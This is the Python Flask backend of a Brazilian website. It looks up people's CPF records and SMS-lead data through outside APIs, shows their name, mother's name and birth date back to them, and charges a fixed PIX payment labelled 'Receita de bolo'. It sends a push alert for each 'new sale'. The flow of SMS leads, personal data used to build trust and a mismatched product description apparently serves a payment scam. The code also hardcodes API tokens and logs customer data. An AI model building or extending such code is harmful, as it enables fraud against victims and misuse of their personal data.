import os
from flask import Flask, render_template, request, jsonify, session
import requests
import json
import re
import random
import string
import logging
import base64
import uuid
from real_pix_api import create_real_pix_provider
from datetime import datetime

app = Flask(__name__)

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configure secret key with fallback for development
secret_key = os.environ.get("SESSION_SECRET")
if not secret_key:
    app.logger.warning("[PROD] SESSION_SECRET não encontrado, usando chave de desenvolvimento")
    secret_key = "dev-secret-key-change-in-production"
app.secret_key = secret_key
app.logger.info(f"[PROD] Secret key configurado: {'***' if secret_key else 'NONE'}")

def _send_pushcut_notification(transaction_data: dict, pix_data: dict) -> None:
    """Send notification to Pushcut webhook when MEDIUS PAG transaction is created"""
    try:
        pushcut_webhook_url = "https://api.pushcut.io/TXeS_0jR0bN2YTIatw4W2/notifications/Nova%20Venda%20PIX"

        # Preparar dados da notificação
        customer_name = transaction_data.get('customer_name', 'Cliente')
        amount = transaction_data.get('amount', 0)
        transaction_id = pix_data.get('transaction_id', 'N/A')

        notification_payload = {
            "title": "🎉 Nova Venda PIX",
            "text": f"Cliente: {customer_name}\nValor: R$ {amount:.2f}\nID: {transaction_id}",
            "isTimeSensitive": True
        }

        app.logger.info(f"[PROD] Enviando notificação Pushcut: {notification_payload}")

        # Enviar notificação
        response = requests.post(
            pushcut_webhook_url,
            json=notification_payload,
            timeout=10
        )

        if response.ok:
            app.logger.info("[PROD] ✅ Notificação Pushcut enviada com sucesso!")
        else:
            app.logger.warning(f"[PROD] ⚠️ Falha ao enviar notificação Pushcut: {response.status_code}")

    except Exception as e:
        app.logger.warning(f"[PROD] ⚠️ Erro ao enviar notificação Pushcut: {str(e)}")

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def get_customer_data(phone):
    try:
        response = requests.get(f'https://api-lista-leads.replit.app/api/search/{phone}')
        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data['data']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching customer data: {e}")
    return None

def get_cpf_data(cpf):
    """Fetch user data from the new CPF API"""
    try:
        response = requests.get(f'https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}')
        if response.status_code == 200:
            data = response.json()
            if data.get('DADOS'):
                return data['DADOS']
    except Exception as e:
        app.logger.error(f"[PROD] Error fetching CPF data: {e}")
    return None

@app.route('/')
def index():
    default_data = {
        'nome': 'JOÃO DA SILVA SANTOS',
        'cpf': '123.456.789-00',
        'phone': '11999999999'
    }

    utm_content = request.args.get('utm_content', '')
    utm_source = request.args.get('utm_source', '')
    utm_medium = request.args.get('utm_medium', '')

    if utm_source == 'smsempresa' and utm_medium == 'sms' and utm_content:
        customer_data = get_customer_data(utm_content)
        if customer_data:
            default_data = customer_data
            default_data['phone'] = utm_content
            session['customer_data'] = default_data

    app.logger.info("[PROD] Renderizando página inicial")
    return render_template('index.html', customer=default_data)

@app.route('/consulta-cpf-inicio')
def consulta_cpf_inicio():
    # Redirect to buscar-cpf page to start CPF consultation process
    app.logger.info("[PROD] Acessando página de início de consulta CPF")
    return render_template('buscar-cpf.html')

@app.route('/<path:cpf>')
def index_with_cpf(cpf):
    # Remove any formatting from CPF (dots and dashes)
    clean_cpf = re.sub(r'[^0-9]', '', cpf)

    # Validate CPF format (11 digits)
    if len(clean_cpf) != 11:
        app.logger.error(f"[PROD] CPF inválido: {cpf}")
        return render_template('buscar-cpf.html')

    # Get user data from API
    cpf_data = get_cpf_data(clean_cpf)

    if cpf_data:
        # Format CPF for display
        formatted_cpf = f"{clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}"

        # Get current date in Brazilian format  
        from datetime import datetime
        today = datetime.now().strftime("%d/%m/%Y")

        customer_data = {
            'nome': cpf_data['nome'],
            'cpf': formatted_cpf,
            'data_nascimento': cpf_data['data_nascimento'],
            'nome_mae': cpf_data['nome_mae'],
            'sexo': cpf_data['sexo'],
            'phone': '',  # Not available from this API
            'today_date': today
        }

        session['customer_data'] = customer_data
        app.logger.info(f"[PROD] Dados encontrados para CPF: {formatted_cpf}")
        return render_template('index.html', customer=customer_data, show_confirmation=True)
    else:
        app.logger.error(f"[PROD] Dados não encontrados para CPF: {cpf}")
        return render_template('buscar-cpf.html')

@app.route('/verificar-cpf')
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
def buscar_cpf():
    app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
    return render_template('buscar-cpf.html')

@app.route('/noticia')
def noticia():
    # Get parameters from URL
    nome_param = request.args.get('nome')
    cpf_param = request.args.get('cpf')

    # Get customer data from session, or use default data
    customer_data = session.get('customer_data', {
        'nome': 'JOÃO DA SILVA SANTOS',
        'cpf': '123.456.789-00',
        'phone': '11999999999'
    })

    # Override with URL parameters if provided
    if nome_param:
        customer_data['nome'] = nome_param.upper()
    if cpf_param:
        customer_data['cpf'] = cpf_param

    # Add current date for consistency
    from datetime import datetime
    customer_data['today_date'] = datetime.now().strftime("%d/%m/%Y")

    app.logger.info(f"[PROD] Acessando página de notícia com dados: {customer_data.get('nome', 'N/A')}")
    # Pass show_confirmation=False to show the news section instead of confirmation form
    return render_template('index.html', customer=customer_data, show_confirmation=False)

@app.route('/generate-pix', methods=['POST'])
def generate_pix():
    """Generate PIX payment using PayBets"""
    try:
        app.logger.info("[PROD] Recebendo solicitação de PIX via PayBets")

        data = request.get_json()

        # Validação básica de campos obrigatórios
        required_fields = ['cpf', 'name', 'email']
        for field in required_fields:
            if not data.get(field):
                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
                return jsonify({
                    'success': False,
                    'error': f'Campo {field} é obrigatório'
                }), 400

        # Dados recebidos do cliente (com dados reais do CPF)
        customer_cpf = data['cpf']
        customer_name = data['name']
        customer_email = data.get('email', 'gerarpagamento@gmail.com')

        app.logger.info(f"[PROD] Gerando PIX para: {customer_name} (CPF: {customer_cpf[:3]}***{customer_cpf[-2:]})")
        app.logger.info(f"[PROD] Dados recebidos: {json.dumps(data, indent=2)}")

        # Valor fixo de R$ 45,84 (produto: Receita de bolo)
        amount = 45.84

        # Criar transação PIX via PayBets
        from paybets_api import PayBetsAPI, PaymentRequestData

        app.logger.info(f"[PROD] Criando transação PayBets para R$ {amount:.2f}")

        try:
            # Criar instância da API PayBets
            paybets_api = PayBetsAPI()

            # Preparar dados do pagamento
            payment_data = PaymentRequestData(
                name=customer_name,
                email=customer_email,
                cpf=customer_cpf,
                amount=amount,
                phone="(11) 98768-9080",
                description="Receita de bolo"
            )

            # Criar pagamento PIX
            payment_response = paybets_api.create_pix_payment(payment_data)

            app.logger.info(f"[PROD] ✅ PIX PayBets criado com sucesso:")
            app.logger.info(f"[PROD] Transaction ID: {payment_response.transaction_id}")
            app.logger.info(f"[PROD] PIX Code: {payment_response.pix_code[:50]}...")
            app.logger.info(f"[PROD] Status: {payment_response.status}")

            # Verificar se temos PIX válido
            if not payment_response.pix_code:
                raise Exception("PayBets não retornou código PIX válido")

            # Preparar resposta formatada
            pix_data = {
                'success': True,
                'transaction_id': payment_response.transaction_id,
                'order_id': payment_response.transaction_id,
                'amount': payment_response.amount,
                'pix_code': payment_response.pix_code,
                'qr_code_image': payment_response.pix_qr_code,
                'status': payment_response.status,
                'provider': 'PayBets'
            }

        except Exception as paybets_error:
            app.logger.error(f"[PROD] Erro PayBets: {paybets_error}")

            # Fallback para PIX brasileiro se PayBets falhar
            app.logger.info(f"[PROD] Tentando fallback com PIX brasileiro...")

            try:
                from brazilian_pix import create_brazilian_pix_provider
                backup_provider = create_brazilian_pix_provider()
                backup_pix = backup_provider.create_pix_payment(
                    amount, customer_name, customer_cpf, customer_email
                )

                app.logger.info(f"[PROD] ✅ PIX brasileiro gerado como fallback")
                pix_data = backup_pix
                pix_data['provider'] = 'Brazilian_PIX_Fallback'

            except Exception as fallback_error:
                app.logger.error(f"[PROD] Erro no fallback brasileiro: {fallback_error}")
                raise Exception(f"Erro PayBets: {paybets_error}. Fallback também falhou: {fallback_error}")

        app.logger.info(f"[PROD] PIX gerado com sucesso via {pix_data.get('provider', 'Unknown')}")

        return jsonify({
            'success': True,
            'pixCode': pix_data['pix_code'],
            'pixQrCode': pix_data['qr_code_image'],
            'orderId': pix_data['order_id'],
            'amount': pix_data['amount'],
            'transactionId': pix_data['transaction_id'],
            'provider': pix_data.get('provider', 'PayBets')
        })

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX via PayBets: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/charge/webhook', methods=['POST'])
def charge_webhook():
    """Handle PayBets payment status webhook notifications"""
    try:
        app.logger.info("[PROD] Webhook PayBets recebido")

        # Log do webhook recebido
        webhook_data = request.get_json()
        app.logger.info(f"[PROD] Dados do webhook PayBets: {webhook_data}")

        # Extrair informações importantes do webhook PayBets
        transaction_id = webhook_data.get('transactionId', webhook_data.get('external_id'))
        status = webhook_data.get('status', 'unknown')
        amount = webhook_data.get('amount', 0)

        app.logger.info(f"[PROD] PayBets Webhook - ID: {transaction_id}, Status: {status}, Valor: R$ {amount}")

        # Processar diferentes status de pagamento
        if status.upper() in ['PAID', 'APPROVED', 'COMPLETED']:
            app.logger.info(f"[PROD] ✅ Pagamento PayBets confirmado: {transaction_id}")
            # Aqui você pode:
            # - Atualizar banco de dados
            # - Enviar confirmação por email
            # - Liberar acesso ao produto/serviço
            # - Enviar notificação push

        elif status.upper() in ['PENDING', 'WAITING_PAYMENT']:
            app.logger.info(f"[PROD] ⏳ Pagamento PayBets pendente: {transaction_id}")

        elif status.upper() in ['FAILED', 'CANCELLED', 'EXPIRED']:
            app.logger.info(f"[PROD] ❌ Pagamento PayBets falhou: {transaction_id}")

        # Responder ao PayBets que o webhook foi processado
        return jsonify({
            'success': True, 
            'message': 'Webhook PayBets processado com sucesso',
            'transaction_id': transaction_id,
            'processed_at': datetime.now().isoformat()
        }), 200

    except Exception as e:
        app.logger.error(f"[PROD] Erro no webhook PayBets: {e}")
        return jsonify({
            'success': False, 
            'error': str(e),
            'provider': 'PayBets'
        }), 500

@app.route('/check-payment-status/<order_id>', methods=['GET'])
def check_payment_status(order_id):
    """Check payment status using PayBets"""
    try:
        app.logger.info(f"[PROD] Verificando status do pagamento PayBets: {order_id}")

        from paybets_api import PayBetsAPI
        paybets_api = PayBetsAPI()

        status_result = paybets_api.check_payment_status(order_id)

        if status_result.get('status') != 'error':
            app.logger.info(f"[PROD] Status PayBets verificado: {status_result['status']}")

            return jsonify({
                'success': True,
                'status': status_result['status'],
                'transaction_id': order_id,
                'paid': status_result.get('paid', False),
                'pending': status_result.get('pending', True),
                'failed': status_result.get('failed', False),
                'original_status': status_result.get('original_status'),
                'payment_data': status_result.get('payment_data', {}),
                'provider': 'PayBets'
            })
        else:
            app.logger.error(f"[PROD] Erro PayBets ao verificar status: {status_result.get('message')}")

            # Tentar fallback com sistema brasileiro se PayBets falhar
            app.logger.info(f"[PROD] Tentando verificação de status via sistema brasileiro...")

            return jsonify({
                'success': True,
                'status': 'pending',
                'transaction_id': order_id,
                'paid': False,
                'pending': True,
                'failed': False,
                'provider': 'Brazilian_PIX_Fallback',
                'message': 'Status não disponível via PayBets, usando fallback'
            })

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status PayBets: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'provider': 'PayBets'
        }), 500

@app.route('/consultar-cpf-paybets/<cpf>', methods=['GET'])
def consultar_cpf_paybets(cpf):
    """Consultar dados de CPF via PayBets API"""
    try:
        app.logger.info(f"[PROD] Consultando CPF via PayBets: {cpf[:3]}***{cpf[-2:]}")

        from paybets_api import PayBetsAPI
        paybets_api = PayBetsAPI()

        cpf_result = paybets_api.consult_cpf(cpf)

        if cpf_result.get('success', False):
            app.logger.info(f"[PROD] ✅ CPF consultado com sucesso via PayBets")

            cpf_data = cpf_result.get('data', {})
            return jsonify({
                'success': True,
                'DADOS': {
                    'cpf': cpf_data.get('cpf', cpf),
                    'nome': cpf_data.get('nome', ''),
                    'nome_mae': cpf_data.get('nome_mae', ''),
                    'data_nascimento': cpf_data.get('data_nascimento', ''),
                    'sexo': cpf_data.get('sexo', '')
                },
                'provider': 'PayBets'
            })
        else:
            app.logger.warning(f"[PROD] Erro PayBets na consulta CPF: {cpf_result.get('message')}")

            # Fallback para API original se PayBets falhar
            app.logger.info(f"[PROD] Tentando consulta CPF via API original...")

            import requests
            try:
                response = requests.get(f'https://api.fontesderenda.com/cpf/{cpf}', timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    app.logger.info(f"[PROD] ✅ CPF consultado via API original (fallback)")
                    return jsonify({
                        'success': True,
                        'DADOS': data.get('DADOS', {}),
                        'provider': 'FontesDeRenda_Fallback'
                    })
                else:
                    raise Exception(f"API original retornou status {response.status_code}")

            except Exception as fallback_error:
                app.logger.error(f"[PROD] Erro no fallback CPF: {fallback_error}")
                return jsonify({
                    'success': False,
                    'error': f"PayBets: {cpf_result.get('message')}. Fallback: {str(fallback_error)}"
                }), 500

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao consultar CPF via PayBets: {e}")
        return jsonify({
            'success': False,
            'error': str(e),
            'provider': 'PayBets'
        }), 500

if __name__ == '__main__':
    # Configurar logging para produção
    if not app.debug:
        import logging
        from logging.handlers import RotatingFileHandler

        # Criar handler para arquivo de log
        file_handler = RotatingFileHandler('app.log', maxBytes=10240, backupCount=10)
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s %(levelname)s: %(message)s [in %(pathname)s:%(lineno)d]'
        ))
        file_handler.setLevel(logging.INFO)
        app.logger.addHandler(file_handler)
        app.logger.setLevel(logging.INFO)
        app.logger.info('[PROD] Aplicação iniciada com PayBets como gateway principal')

    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)